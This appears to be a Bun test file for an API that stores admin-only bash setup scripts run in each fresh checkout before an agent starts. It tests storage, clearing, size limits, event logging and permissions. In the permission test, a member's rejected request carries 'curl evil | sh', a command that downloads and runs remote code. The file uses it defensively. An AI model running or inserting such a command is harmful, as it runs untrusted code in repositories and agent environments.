/**
 * A repository's setup script (migration 145): bash a Run executes once in
 * each fresh checkout before the agent starts. It is set when a repository
 * is added, made with its project, or changed; read back with the
 * repository and its project; blank is none; over 16 KiB or holding a NUL
 * is refused with 400 naming the field. Only an organisation admin may set
 * it, and each change is a repository.updated event by whoever made it.
 * Unlike a URL or branch, it may change while work is delivered there.
 *
 * Requires DATABASE_URL: the owner of a database migrated to the release.
 */

import { afterAll, beforeAll, expect, test } from "bun:test";
import { SQL } from "bun";
import { SETUP_SCRIPT_MAX_BYTES, SETUP_SCRIPT_MESSAGE } from "@dude/domain";
import { personPrincipal } from "../src/api/auth.ts";
import { Router } from "../src/api/router.ts";
import { registerProjectRoutes } from "../src/api/routes/projects.ts";
import { registerStructureRoutes } from "../src/api/routes/structure.ts";
import { closePool, setPool } from "../src/db/client.ts";

const org = `org_setup_${Bun.randomUUIDv7("hex").slice(-12)}`;
const admin = `${org}_admin`;
const member = `${org}_member`;
const project = `${org}_project`;
let owner: SQL;
let app: SQL;
let asAdmin: Router;
let asMember: Router;

beforeAll(async () => {
  owner = new SQL(process.env.DATABASE_URL!);
  const url = new URL(process.env.DATABASE_URL!);
  url.username = "dude_app"; url.password = "dude_app";
  app = new SQL(url.toString()); setPool(app);
  await owner`INSERT INTO organizations (id, name, slug) VALUES (${org}, ${org}, ${org})`;
  await owner`INSERT INTO people (id, organization_id, name, role) VALUES
    (${admin}, ${org}, 'Admin', 'admin'), (${member}, ${org}, 'Member', 'member')`;
  await owner`INSERT INTO projects (id, organization_id, name, slug, key_prefix) VALUES (${project}, ${org}, 'Web', ${`${org}-web`}, 'WEB')`;
  const routers = [];
  for (const who of [admin, member]) {
    const principal = await personPrincipal(org, who);
    const router = new Router(async () => principal);
    registerProjectRoutes(router);
    registerStructureRoutes(router);
    routers.push(router);
  }
  [asAdmin, asMember] = routers as [Router, Router];
});
afterAll(async () => {
  await closePool(app);
  await owner`DELETE FROM organizations WHERE id = ${org}`;
  await owner.end();
});

const call = (router: Router, method: string, path: string, body?: Record<string, unknown>) =>
  router.handle(new Request(`http://dude.test${path}`, {
    method, headers: { "content-type": "application/json" }, body: body === undefined ? undefined : JSON.stringify(body),
  }));
const stored = async (id: string) =>
  ((await owner`SELECT setup_script FROM repositories WHERE id = ${id}`)[0] as { setup_script: string | null }).setup_script;
const unique = (name: string) => `${name}-${Bun.randomUUIDv7("hex").slice(-8)}`;

const HOOKS = 'ln -sf ../../scripts/pre-commit "$(git rev-parse --git-path hooks)/pre-commit"\n';

test("a setup script is kept as written when a repository is added, and read back with it and its project", async () => {
  const res = await call(asAdmin, "POST", `/v1/projects/${project}/repositories`,
    { name: unique("api"), url: "https://github.com/acme/api.git", setupScript: HOOKS });
  expect(res.status).toBe(201);
  const repo = (await res.json()) as { id: string; setupScript: string | null };
  expect(repo.setupScript).toBe(HOOKS);
  expect(await stored(repo.id)).toBe(HOOKS);

  const read = (await (await call(asAdmin, "GET", `/v1/projects/${project}`)).json()) as {
    repositories: Array<{ id: string; setupScript: string | null }>;
  };
  expect(read.repositories.find((r) => r.id === repo.id)?.setupScript).toBe(HOOKS);

  // None given: none.
  const plain = (await (await call(asAdmin, "POST", `/v1/projects/${project}/repositories`,
    { name: unique("web"), url: "https://github.com/acme/web.git" })).json()) as { id: string; setupScript: string | null };
  expect(plain.setupScript).toBeNull();
  expect(await stored(plain.id)).toBeNull();
});

test("a project made with its repositories keeps each one's setup script", async () => {
  const slug = unique("made");
  const res = await call(asAdmin, "POST", "/v1/projects", { name: "Made", slug, repositories: [
    { name: "api", url: "https://github.com/acme/api.git", setupScript: HOOKS },
    { name: "web", url: "https://github.com/acme/web.git" }] });
  expect(res.status).toBe(201);
  const made = (await res.json()) as { repositories: Array<{ id: string; name: string; setupScript: string | null }> };
  expect(made.repositories.map((r) => [r.name, r.setupScript])).toEqual([["api", HOOKS], ["web", null]]);
  expect(await stored(made.repositories[0]!.id)).toBe(HOOKS);
});

test("changing a setup script stores it and records who changed it; blank clears it; leaving it out keeps it", async () => {
  const id = (await (await call(asAdmin, "POST", `/v1/projects/${project}/repositories`,
    { name: unique("svc"), url: "https://github.com/acme/svc.git" })).json() as { id: string }).id;

  const set = await call(asAdmin, "PATCH", `/v1/repositories/${id}`, { setupScript: "make hooks\n" });
  expect(set.status).toBe(200);
  expect(((await set.json()) as { setupScript: string }).setupScript).toBe("make hooks\n");
  expect(await stored(id)).toBe("make hooks\n");

  const events = await owner`SELECT actor_type, actor_id, payload FROM events
    WHERE organization_id = ${org} AND event_type = 'repository.updated' AND payload->>'repositoryId' = ${id} ORDER BY cursor`;
  expect(events.map((e: { actor_id: string; payload: { setupScript?: string } }) => [e.actor_id, e.payload.setupScript]))
    .toEqual([[admin, "make hooks\n"]]);

  // Another field alone leaves the script as it was.
  const preserved = await call(asAdmin, "PATCH", `/v1/repositories/${id}`, { trust: "untrusted_external" });
  expect(preserved.status).toBe(200);
  expect((await preserved.json() as { setupScript: string | null }).setupScript).toBe("make hooks\n");
  expect(await stored(id)).toBe("make hooks\n");
  const listed = (await (await call(asAdmin, "GET", `/v1/projects/${project}`)).json()) as {
    repositories: Array<{ id: string; setupScript: string | null }>;
  };
  expect(listed.repositories.find((r) => r.id === id)?.setupScript).toBe("make hooks\n");

  for (const blank of ["", "  \n\t", null]) {
    await owner`UPDATE repositories SET setup_script = 'x' WHERE id = ${id}`;
    const before = await owner`SELECT count(*)::int AS count FROM events
      WHERE organization_id = ${org} AND event_type = 'repository.updated' AND payload->>'repositoryId' = ${id}`;
    const cleared = await call(asAdmin, "PATCH", `/v1/repositories/${id}`, { setupScript: blank });
    expect(cleared.status).toBe(200);
    expect(((await cleared.json()) as { setupScript: string | null }).setupScript).toBeNull();
    expect(await stored(id)).toBeNull();
    const clearedList = (await (await call(asAdmin, "GET", `/v1/projects/${project}`)).json()) as {
      repositories: Array<{ id: string; setupScript: string | null }>;
    };
    expect(clearedList.repositories.find((r) => r.id === id)?.setupScript).toBeNull();
    const after = await owner`SELECT actor_id, payload FROM events
      WHERE organization_id = ${org} AND event_type = 'repository.updated' AND payload->>'repositoryId' = ${id} ORDER BY cursor DESC LIMIT 1`;
    expect((after[0] as { actor_id: string; payload: { setupScript?: string | null } }).actor_id).toBe(admin);
    expect((after[0] as { payload: { setupScript?: string | null } }).payload.setupScript).toBeNull();
  }
});

test("a setup script may change while work is delivered to its repository: it reaches the Runs started after", async () => {
  const id = (await (await call(asAdmin, "POST", `/v1/projects/${project}/repositories`,
    { name: unique("busy"), url: "https://github.com/acme/busy.git" })).json() as { id: string }).id;
  const task = `${org}_task_${Bun.randomUUIDv7("hex").slice(-8)}`;
  await owner`INSERT INTO tasks (id, organization_id, project_id, number, title, goal)
    VALUES (${task}, ${org}, ${project}, ${Math.floor(Math.random() * 1e6) + 1}, 'T', 'G')`;
  await owner`INSERT INTO task_repositories (organization_id, task_id, repository_id, access) VALUES (${org}, ${task}, ${id}, 'write')`;
  await owner`INSERT INTO workflow_runs (id, organization_id, task_id, workflow_type, idempotency_key, status, step)
    VALUES (${`${task}_wf`}, ${org}, ${task}, 'deliver', ${`${task}_wf`}, 'running', 'implement')`;

  expect((await call(asAdmin, "PATCH", `/v1/repositories/${id}`, { setupScript: "true\n" })).status).toBe(200);
  expect(await stored(id)).toBe("true\n");
  // A URL still may not.
  expect((await call(asAdmin, "PATCH", `/v1/repositories/${id}`, { url: "https://github.com/acme/other.git" })).status).toBe(409);
});

test("a setup script over the size limit, or with a NUL, is refused with 400 naming the field, and nothing changes", async () => {
  const id = (await (await call(asAdmin, "POST", `/v1/projects/${project}/repositories`,
    { name: unique("big"), url: "https://github.com/acme/big.git", setupScript: "keep\n" })).json() as { id: string }).id;
  // At the limit in bytes: taken. One multi-byte character over: refused.
  const atLimit = "#".repeat(SETUP_SCRIPT_MAX_BYTES);
  expect((await call(asAdmin, "PATCH", `/v1/repositories/${id}`, { setupScript: atLimit })).status).toBe(200);
  expect(await stored(id)).toBe(atLimit);
  await owner`UPDATE repositories SET setup_script = 'keep' WHERE id = ${id}`;

  for (const bad of ["é".repeat(SETUP_SCRIPT_MAX_BYTES / 2) + "#", "echo a\0b", 42]) {
    const res = await call(asAdmin, "PATCH", `/v1/repositories/${id}`, { setupScript: bad });
    expect(res.status).toBe(400);
    const body = (await res.json()) as { error: { message: string } };
    if (typeof bad === "string") expect(body.error.message).toBe(`request body failed validation: setupScript: ${SETUP_SCRIPT_MESSAGE}`);
    expect(await stored(id)).toBe("keep");
  }
  const added = await call(asAdmin, "POST", `/v1/projects/${project}/repositories`,
    { name: unique("big"), url: "https://github.com/acme/big2.git", setupScript: "#".repeat(SETUP_SCRIPT_MAX_BYTES + 1) });
  expect(added.status).toBe(400);
});

test("only an organisation admin may set a setup script", async () => {
  const id = (await (await call(asAdmin, "POST", `/v1/projects/${project}/repositories`,
    { name: unique("guard"), url: "https://github.com/acme/guard.git" })).json() as { id: string }).id;
  expect((await call(asMember, "PATCH", `/v1/repositories/${id}`, { setupScript: "curl evil | sh\n" })).status).toBe(403);
  expect((await call(asMember, "POST", `/v1/projects/${project}/repositories`,
    { name: unique("guard"), url: "https://github.com/acme/g2.git", setupScript: "x" })).status).toBe(403);
  expect(await stored(id)).toBeNull();
});
